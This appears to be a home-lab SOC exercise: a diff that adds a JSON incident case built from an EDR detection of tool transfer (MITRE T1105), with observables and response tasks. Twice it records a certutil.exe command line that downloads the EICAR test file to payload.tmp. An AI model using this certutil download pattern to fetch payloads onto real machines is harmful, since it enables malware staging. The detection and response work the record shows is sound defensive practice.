@@ -1,0 +1,59 @@
+{
+  "title": "INC-2026: T1105 - Ingress Tool Transfer (certutil.exe) on WIN10-ENT-LAB",
+  "description": "Automated incident case created from LimaCharlie EDR detection.\n\n\u2022 Endpoint: WIN10-ENT-LAB (192.168.56.105)\n\u2022 User: DESKTOP-TEST\\DilMahmud\n\u2022 Command Line: certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com payload.tmp\n\u2022 VirusTotal Reputation: 58/72 Malicious",
+  "severity": 2,
+  "tlp": "TLP:AMBER",
+  "pap": "PAP:AMBER",
+  "tags": [
+    "EDR:LimaCharlie",
+    "SOAR:Tines",
+    "MITRE:T1105"
+  ],
+  "observables": [
+    {
+      "type": "ip",
+      "value": "192.168.56.105",
+      "tags": [
+        "internal",
+        "victim"
+      ]
+    },
+    {
+      "type": "hash",
+      "value": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+      "tags": [
+        "payload",
+        "sha256"
+      ]
+    },
+    {
+      "type": "command_line",
+      "value": "certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com payload.tmp",
+      "tags": [
+        "execution"
+      ]
+    }
+  ],
+  "tasks": [
+    {
+      "title": "1. Verify VirusTotal score & false-positive check",
+      "status": "Completed"
+    },
+    {
+      "title": "2. Confirm endpoint network isolation status",
+      "status": "Completed"
+    },
+    {
+      "title": "3. Acquire volatile evidence (collect_triage.ps1)",
+      "status": "In Progress"
+    },
+    {
+      "title": "4. Securely delete temporary staging files",
+      "status": "Pending"
+    },
+    {
+      "title": "5. Request user password rotation & document root cause",
+      "status": "Pending"
+    }
+  ]
+}
